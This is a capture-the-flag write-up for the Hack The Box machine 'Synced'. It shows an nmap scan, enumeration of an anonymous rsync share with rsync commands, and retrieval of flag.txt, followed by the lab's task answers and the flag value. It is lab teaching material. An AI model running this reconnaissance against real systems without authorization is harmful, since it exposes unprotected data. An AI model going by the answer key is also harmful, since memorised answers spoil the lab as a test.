---
title: HackTheBox - Synced
authors: Samarth
categories: [HackTheBox , Starting Point - Tier 0]
tags: [Linux, Resync, Protocols, Reconnaissance, Anonymous/Guest Access]
math: true
mermaid: true
---

![Synced-HTB](/assets/images/starting-point/Synced-HTB/banner.png)

## TL;DR

This writeup is based on the [__Synced__](https://app.hackthebox.com/starting-point){:target="_blank"} machine, an easy-rated Linux box on Hack The Box. After scanning the target, I found that port `873` was open, corresponding to the `rsync` service. Upon enumerating the `rsync` service, I discovered the `public` module, labeled as an anonymous share. I accessed this module and found a file named `flag.txt`. After downloading and reading the file, I found the flag inside.

## Scanning Network

I began by performing an Nmap scan, which revealed open port `873`, corresponding to `rsync`. Here are the results from the Nmap scan:

```bash
 nmap -sC -sV -A -T4 -Pn 10.129.228.37 -oN scan/normal.scan 
Starting Nmap 7.94 ( https://nmap.org ) at 2025-02-16 13:50 IST
Nmap scan report for 10.129.228.37
Host is up (0.21s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
```

While inspecting the Nmap output, I identified the rsync service running on port `873`.

`rsync` is a powerful file transfer and synchronization tool commonly used for efficiently copying and syncing files across machines or directories. It’s known for its speed, flexibility, and ability to only transfer differences (incremental updates) between the source and the destination.

## Enumeration

Let's try to connect to the target IP address and check if anything interesting is available.

The command `rsync -av --list-only rsync://10.129.228.37:873/` connects to the `rsync` server at IP `10.129.228.37` on port `873` and lists the available files and directories without transferring any data. The `-a` flag preserves file attributes, `-v` shows detailed output, and `--list-only` ensures no actual transfer occurs.

```bash
rsync -av --list-only rsync://10.129.228.37/    
public         	Anonymous Share
```

The output indicates that the `rsync` server at `10.129.228.37` has an accessible module named `public`, which is labeled as an "Anonymous Share." This suggests that the `public` directory is likely available for anonymous access, meaning no authentication is required to access its contents. The module name (`public`) suggests it may be used for sharing files without restrictions. You can now explore or interact with this module further if you want to download files from it or check for write permissions.

## Exploitation

Let's try accessing `public` (Anonymous Share).

```bash
rsync -av rsync://10.129.228.37/public/
receiving incremental file list
drwxr-xr-x          4,096 2022/10/25 03:32:23 .
-rw-r--r--             33 2022/10/25 03:02:03 flag.txt
```

The `public` module contains the `flag.txt` file. Let's download the file and read its content.


```bash
rsync -av rsync://10.129.228.37/public/flag.txt .
receiving incremental file list
flag.txt

sent 43 bytes  received 135 bytes  14.24 bytes/sec
total size is 33  speedup is 0.19

cat flag.txt 
72eaf5344ebb84908ae543a719830519
```

## Tasks

### What is the default port for rsync?

```plaintext
873
```

### How many TCP ports are open on the remote host?

```plaintext
1
```

What is the protocol version used by rsync on the remote machine?

```plaintext
31
```

### What is the most common command name on Linux to interact with rsync?

```plaintext
rsync
```

### What credentials do you have to pass to rsync in order to use anonymous authentication? anonymous:anonymous, anonymous, None, rsync:rsync

```plaintext
None
```

### What is the option to only list shares and files on rsync? (No need to include the leading -- characters)

```plaintext
list-only
```

### Submit root flag

```plaintext
72eaf5344ebb84908ae543a719830519
```

Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t){:target="_blank"}.